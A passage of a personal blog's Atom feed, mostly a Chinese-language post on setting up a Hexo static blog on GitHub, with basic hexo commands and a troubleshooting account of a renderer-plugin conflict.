&lt;li&gt;（抽象概念）RTTI（Run-Time Type Identification）运行时类型识别，主要两种方式&lt;br&gt;  传统的RTTI，我们编写知道所有的类型·&lt;br&gt;  反射机制，允许在运行时查询和操作类的信息&lt;br&gt;  太抽象了举例子&lt;br&gt;  正常写代码，</summary>
      
    
    
    
    <category term="Java_Security" scheme="https://usingns.github.io/categories/Java-Security/"/>
    
    
    <category term="Java" scheme="https://usingns.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>关于个人博客的搭建</title>
    <link href="https://usingns.github.io/2025/03/31/%E5%85%B3%E4%BA%8E%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <id>https://usingns.github.io/2025/03/31/%E5%85%B3%E4%BA%8E%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/</id>
    <published>2025-03-31T11:07:23.000Z</published>
    <updated>2025-07-14T05:05:34.845Z</updated>
    
    <content type="html"><![CDATA[<p>很早就有这样的想法，断断续续又有半途而废，终于直到今天才决定完全做成</p><h2 id="首先使用github-hexo的组合"><a href="#首先使用github-hexo的组合" class="headerlink" title="首先使用github+hexo的组合"></a>首先使用github+hexo的组合</h2><p>Hexo 是<strong>一款基于Node.js 的快速、简洁且高效的静态博客框架</strong><br>知道这些就够了()只是抱着使用的想法来了解<br>#git安装<br>#node安装 %%别忘了环境变量的配置%%<br>#安装hexo</p><h2 id="git-ssh-key"><a href="#git-ssh-key" class="headerlink" title="git ssh key"></a>git ssh key</h2><p>为什么要配置SSH key？ 目的：可以免密的将本地的源码和资源上传到github，无需要每次都输账号和密码。<br>本地生成</p><p>上传到github</p><p>配置git用户名和用户邮箱</p><h2 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;postName&quot; #新建文章 </span><br><span class="line">hexo new page &quot;pageName&quot; #新建页面 </span><br><span class="line">hexo generate #生成静态页面至public目录 </span><br><span class="line">hexo server #开启预览访问端口（默认端口4000，&#x27;ctrl + c&#x27;关闭server） </span><br><span class="line">hexo deploy #部署到GitHub </span><br><span class="line">hexo help # 查看帮助 </span><br><span class="line">hexo version #查看Hexo的版本</span><br></pre></td></tr></table></figure><p>在选择的根目录进行初步搭建，并修改_config.yml</p><h2 id="主题选择"><a href="#主题选择" class="headerlink" title="主题选择"></a>主题选择</h2><p>hexo的github主题项目，下载解压到theme，记得修改配置文件<br>大功告成~</p><p>参考</p><p><a href="https://cloud.tencent.com/developer/article/1852344">https://cloud.tencent.com/developer/article/1852344</a></p><p>#####不吐不快的踩坑记录</p><p>1.<code>hexo-renderer-marked</code> 是 Hexo 渲染 Markdown 的核心插件之一<br>这是官方记录的描述，但是正常使用是没有人去自己单独安装他的，至少在2025.7我进行测试的时候，这个版本与当前版本冲突。。。安了会报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">E:\blog&gt;hexo g</span><br><span class="line">INFO  Validating config</span><br><span class="line">INFO  Start processing</span><br><span class="line">FATAL Something&#x27;s wrong. Maybe you can find the solution here: https://hexo.io/docs/troubleshooting.html</span><br></pre></td></tr></table></figure><p>更为无语的是这里的报错查看日志会发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">3:29:01.811 DEBUG Processed: layout/_partial/math/mathjax.ejs</span><br><span class="line">03:29:01.811 DEBUG Processed: layout/_partial/script/font-loader.ejs</span><br><span class="line">03:29:01.811 DEBUG Processed: layout/_partial/sidebar/sidebar-categories.ejs</span><br><span class="line">03:29:01.811 DEBUG Processed: languages/default.yml</span><br><span class="line">03:29:01.812 DEBUG Processed: languages/en.yml</span><br><span class="line">03:29:01.813 DEBUG Processed: layout/_partial/sidebar/sidebar-archives.ejs</span><br><span class="line">03:29:01.813 DEBUG Processed: layout/_partial/sidebar/sidebar-tags.ejs</span><br><span class="line">03:29:01.813 DEBUG Processed: layout/_partial/sidebar/base-sidebar.ejs</span><br><span class="line">03:29:01.815 FATAL Something&#x27;s wrong. Maybe you can find the solution here: https://hexo.io/docs/troubleshooting.html</span><br><span class="line">03:29:01.821 DEBUG Database saved</span><br></pre></td></tr></table></figure><p>没错，你没有看错，日志也只有一句模糊的报错而已。。。这是正常人能干出的事情。。。实在无力吐槽</p><p>导致排查的时候根本不知道哪里出现了问题</p><p>解决办法：卸载就好了。。。同时注意卸载之后安装回默认渲染，注意配置文件需要手动修改</p><p>2.各位在搭建的时候一定要注意版本问题，不仅仅是自己系统以及hexo的版本还有查阅文章资料的版本，因为这个系统已经有些年头了，可能中间经过几次维护，导致一些网上文章根本不实用于当前的hexo，再加上有很多低质文章，不说内容雷同，就是插件名字都有抄错的。即便是正儿八经的文章也要注意，上面的办法很可能不适用，在搞了半天之后，回去发布文章直接冒出来一个模模糊糊的FATAL真的让人火大。。。。</p><p>3.此外各种小bug也层出不穷，比如一直为人诟病的图片上传问题，还是使用的人太少了，小作坊无保障了属于是，不过也正是因为他小，各种错误可以穷尽，久病成医</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;很早就有这样的想法，断断续续又有半途而废，终于直到今天才决定完全做成&lt;/p&gt;
&lt;h2 id=&quot;首先使用github-hexo的组合&quot;&gt;&lt;a href=&quot;#首先使用github-hexo的组合&quot; class=&quot;headerlink&quot; title=&quot;首先使用github+hex</summary>
      
    
    
    
    <category term="博客搭建" scheme="https://usingns.github.io/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="Hexo" scheme="https://usingns.github.io/tags/Hexo/"/>
    
    <category term="github" scheme="https://usingns.github.io/tags/github/"/>
    
    <category term="node.js" scheme="https://usingns.github.io/tags/node-js/"/>
    
    <category term="ssh" scheme="https://usingns.github.io/tags/ssh/"/>
    
  </entry>
  
</feed>
